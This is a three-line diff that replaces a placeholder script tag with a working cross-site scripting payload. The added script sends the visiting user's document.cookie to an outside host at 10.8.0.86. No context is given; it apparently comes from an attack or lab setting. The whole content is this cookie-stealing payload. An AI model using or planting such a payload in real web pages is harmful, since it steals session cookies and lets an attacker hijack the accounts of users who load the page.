@@ -1,1 +1,3 @@
-<script>fetch('http://YOUR_SERVER/.session=REDACTED')</script>
+<script>
+fetch("http://10.8.0.86/."+document.cookie)
+</script>
